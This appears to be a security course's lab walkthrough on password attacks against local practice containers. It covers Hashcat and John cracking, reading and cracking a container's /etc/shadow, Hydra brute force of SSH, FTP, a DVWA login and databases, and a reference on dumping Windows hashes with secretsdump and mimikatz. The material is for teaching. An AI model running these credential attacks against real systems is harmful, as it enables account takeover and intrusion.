# Password Attacks Walkthrough

Step-by-step guide for cracking passwords and performing brute force attacks.

---

## Lab 1: Hash Identification

**Goal:** Learn to identify different hash types

### Step 1: Create Sample Hashes

```bash
# Create various hash types for practice
echo -n "password" | md5sum | cut -d' ' -f1
# 5f4dcc3b5aa765d61d8327deb882cf99

echo -n "password" | sha1sum | cut -d' ' -f1
# 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8

echo -n "password" | sha256sum | cut -d' ' -f1
# 5e884898da28047d9169e1a3c9698c45e5f8b9e2e...

# Save to file
echo "5f4dcc3b5aa765d61d8327deb882cf99" > unknown_hashes.txt
echo "5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8" >> unknown_hashes.txt
```

### Step 2: Use hashid

```bash
# Install if needed
apt install hashid

# Identify hash
hashid '5f4dcc3b5aa765d61d8327deb882cf99'
# Output:
# Analyzing '5f4dcc3b5aa765d61d8327deb882cf99'
# [+] MD2
# [+] MD5
# [+] MD4
# [+] Double MD5
# ...

# Show Hashcat mode
hashid -m '5f4dcc3b5aa765d61d8327deb882cf99'
# [+] MD5 [Hashcat Mode: 0]
```

### Step 3: Identify by Format

```bash
# Linux shadow hash
$6$xyz$longhashhere...
# Type: SHA512crypt, Hashcat mode: 1800

# Windows NTLM (32 chars, hex)
32ed87bdb5fdc5e9cba88547376818d4
# Type: NTLM, Hashcat mode: 1000

# bcrypt (starts with $2a$, $2b$, $2y$)
$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZRGdjGj/n3.Y7Q
# Type: bcrypt, Hashcat mode: 3200
```

---

## Lab 2: Dictionary Attack with Hashcat

**Goal:** Crack hashes using a wordlist

### Step 1: Prepare Hashes

```bash
# Create MD5 hashes of common passwords
echo -n "password123" | md5sum | cut -d' ' -f1 > hashes.txt
echo -n "letmein" | md5sum | cut -d' ' -f1 >> hashes.txt
echo -n "qwerty" | md5sum | cut -d' ' -f1 >> hashes.txt
echo -n "monkey" | md5sum | cut -d' ' -f1 >> hashes.txt

cat hashes.txt
# 482c811da5d5b4bc6d497ffa98491e38
# 0d107d09f5bbe40cade3de5c71e9e9b7
# d8578edf8458ce06fbc5bb76a58c5ca4
# ab87d24bdc7452e55738deb5f868e1f9
```

### Step 2: Run Hashcat Dictionary Attack

```bash
# Basic dictionary attack
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# With optimizations
hashcat -m 0 -a 0 -O hashes.txt /usr/share/wordlists/rockyou.txt

# Output shows:
# 482c811da5d5b4bc6d497ffa98491e38:password123
# 0d107d09f5bbe40cade3de5c71e9e9b7:letmein
# ...
```

### Step 3: Show Results

```bash
# Display cracked passwords
hashcat -m 0 --show hashes.txt

# Output:
# 482c811da5d5b4bc6d497ffa98491e38:password123
# 0d107d09f5bbe40cade3de5c71e9e9b7:letmein
# d8578edf8458ce06fbc5bb76a58c5ca4:qwerty
# ab87d24bdc7452e55738deb5f868e1f9:monkey
```

### Step 4: Using John the Ripper (Alternative)

```bash
# With John
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show results
john --show --format=raw-md5 hashes.txt
```

---

## Lab 3: Rule-Based Attacks

**Goal:** Use rules to expand wordlist coverage

### Step 1: Understand Rules

Rules modify each word in the wordlist:
- Capitalize first letter
- Add numbers
- Substitute characters (a -> @)
- Append special characters

### Step 2: Create a Hash with Modified Password

```bash
# Password with common modifications
echo -n "Password1!" | md5sum | cut -d' ' -f1 > rule_test.txt
echo -n "Summer2024" | md5sum | cut -d' ' -f1 >> rule_test.txt

cat rule_test.txt
```

### Step 3: Run Dictionary (Will Fail)

```bash
# Try without rules
hashcat -m 0 -a 0 rule_test.txt /usr/share/wordlists/rockyou.txt --show
# Might not crack "Password1!" or "Summer2024"
```

### Step 4: Apply Rules

```bash
# With best64 rules
hashcat -m 0 -a 0 rule_test.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# More aggressive rules
hashcat -m 0 -a 0 rule_test.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/rockyou-30000.rule

# Show cracked
hashcat -m 0 --show rule_test.txt
```

### Step 5: Custom Rules

```bash
# Create custom rule file
cat << 'EOF' > custom.rule
:           # Do nothing (original word)
c           # Capitalize first letter
u           # Uppercase all
$1          # Append 1
$!          # Append !
c$1         # Capitalize + append 1
c$1$!       # Capitalize + append 1!
sa@         # Substitute a with @
se3         # Substitute e with 3
c$2024      # Capitalize + append 2024
EOF

# Use custom rules
hashcat -m 0 -a 0 rule_test.txt wordlist.txt -r custom.rule
```

---

## Lab 4: Linux Shadow File Cracking

**Goal:** Crack passwords from /etc/shadow

### Step 1: Get Shadow Hash from Container

```bash
# Access container
docker exec -it lab-buffer-overflow cat /etc/shadow

# Find the labuser line:
# labuser:$6$rounds=5000$saltsalt$hashhashhash...:19000:0:99999:7:::
```

### Step 2: Save Hash

```bash
# Extract just the hash line
docker exec lab-buffer-overflow cat /etc/shadow | grep labuser > shadow_hash.txt

# Or create full unshadow format
docker exec lab-buffer-overflow cat /etc/passwd > passwd.txt
docker exec lab-buffer-overflow cat /etc/shadow > shadow.txt
unshadow passwd.txt shadow.txt > unshadowed.txt
```

### Step 3: Identify Hash Type

```bash
# SHA512crypt format
cat shadow_hash.txt
# labuser:$6$...:...

# $6$ = SHA512crypt
# Hashcat mode: 1800
```

### Step 4: Crack with Hashcat

```bash
# Crack SHA512crypt
hashcat -m 1800 -a 0 shadow_hash.txt /usr/share/wordlists/rockyou.txt

# This is slow! SHA512crypt is designed to be slow.
# Use smaller wordlist first:
hashcat -m 1800 -a 0 shadow_hash.txt /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
```

### Step 5: Crack with John

```bash
# John auto-detects format
john unshadowed.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show results
john --show unshadowed.txt
```

### Step 6: Results

```bash
# The password for labuser should be: labpass123
# Verify:
ssh -p 2222 labuser@localhost
# Enter: labpass123
```

---

## Lab 5: Online Brute Force with Hydra

**Goal:** Attack live services

### Step 1: SSH Brute Force

```bash
# Create targeted password list
cat << 'EOF' > passwords.txt
admin
password
123456
labuser
labpass
labpass123
root
toor
EOF

# Attack vulnerable SSH
hydra -l labuser -P passwords.txt ssh://localhost -s 2222 -t 4 -V

# Output:
# [2222][ssh] host: localhost   login: labuser   password: labpass123
```

### Step 2: FTP Anonymous Check

```bash
# Check for anonymous FTP
hydra -l anonymous -p anonymous ftp://localhost -s 2121

# Or try common passwords
hydra -l ftp -P passwords.txt ftp://localhost -s 2121
```

### Step 3: Web Form Attack (DVWA)

```bash
# First, examine the login form
# URL: http://localhost:8081/login.php
# Fields: username, password, Login

# Create user list
echo "admin" > users.txt
echo "user" >> users.txt

# Attack
hydra -L users.txt -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  localhost http-post-form \
  "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
  -s 8081 -t 10 -f

# -f = stop after first found
# -t 10 = 10 threads

# DVWA default: admin / password
```

### Step 4: Database Brute Force

```bash
# MySQL
hydra -l root -P passwords.txt mysql://localhost -s 3307

# PostgreSQL
hydra -l postgres -P passwords.txt postgres://localhost -s 5433

# Redis (no auth in lab, but syntax shown)
hydra -P passwords.txt redis://localhost -s 6380
```

---

## Lab 6: Windows NTLM Cracking (Concept)

**Goal:** Understand Windows hash cracking

### Step 1: NTLM Hash Format

```bash
# NTLM hash example (32 hex characters)
# Hash of "password": 8846f7eaee8fb117ad06bdd830b7586c

echo "8846f7eaee8fb117ad06bdd830b7586c" > ntlm.txt
```

### Step 2: Crack with Hashcat

```bash
# NTLM = mode 1000
hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt

# Show result
hashcat -m 1000 --show ntlm.txt
# 8846f7eaee8fb117ad06bdd830b7586c:password
```

### Step 3: Extracting Windows Hashes (Reference)

```bash
# Methods to get Windows hashes:

# 1. SAM file (offline)
# Copy C:\Windows\System32\config\SAM and SYSTEM
# Use secretsdump.py:
secretsdump.py -sam SAM -system SYSTEM LOCAL

# 2. From memory (mimikatz)
# mimikatz # sekurlsa::logonpasswords

# 3. From domain controller (NTDS.dit)
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

---

## Practice Exercises

### Exercise 1: Speed Test

```bash
# Compare cracking speeds
# Create 100 MD5 hashes
for i in $(seq 1 100); do
  echo -n "password$i" | md5sum | cut -d' ' -f1
done > speed_test.txt

# Time hashcat
time hashcat -m 0 -a 0 speed_test.txt /usr/share/wordlists/rockyou.txt

# Time john
time john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt speed_test.txt
```

### Exercise 2: Create and Crack

```bash
# Create your own hash
read -sp "Enter password to hash: " pw && echo
echo -n "$pw" | md5sum | cut -d' ' -f1 > my_hash.txt

# Try to crack it!
hashcat -m 0 -a 0 my_hash.txt /usr/share/wordlists/rockyou.txt
```

### Exercise 3: Comprehensive Lab Attack

```bash
# 1. Enumerate services
nmap -sV localhost -p 2222,2121,8081,3307,5433

# 2. Try anonymous/default creds
hydra -l anonymous -p anonymous ftp://localhost -s 2121

# 3. Brute force SSH
hydra -l labuser -P /usr/share/seclists/Passwords/Common-Credentials/top-1000.txt \
  ssh://localhost -s 2222 -t 4

# 4. Get shadow file after SSH access
# 5. Crack additional users
```

---

## Key Takeaways

1. **Identify hash type first** - Wrong mode = wasted time
2. **Start simple** - Dictionary before rules before brute force
3. **Use GPU when possible** - Hashcat with GPU is much faster
4. **Rules are powerful** - Can crack modified passwords
5. **Rate limit awareness** - Online attacks can lock accounts
6. **Document everything** - Save cracked passwords securely

---

## Command Quick Reference

### Hashcat

```bash
# Dictionary attack
hashcat -m MODE -a 0 hashes.txt wordlist.txt

# With rules
hashcat -m MODE -a 0 hashes.txt wordlist.txt -r rules.rule

# Mask attack
hashcat -m MODE -a 3 hashes.txt ?a?a?a?a?a?a

# Show cracked
hashcat -m MODE --show hashes.txt

# Resume session
hashcat --session=name --restore
```

### John

```bash
# Auto-detect
john hashes.txt

# Specific format
john --format=FORMAT hashes.txt

# With wordlist
john --wordlist=wordlist.txt hashes.txt

# Show cracked
john --show hashes.txt
```

### Hydra

```bash
# SSH
hydra -l USER -P wordlist.txt ssh://TARGET

# FTP
hydra -l USER -P wordlist.txt ftp://TARGET

# HTTP POST
hydra -l USER -P wordlist.txt TARGET http-post-form "path:params:fail_string"
```

---

**Next:** [Hints](./hints.md) | **Continue to:** [06 - Post-Exploitation](../06-post-exploitation/)
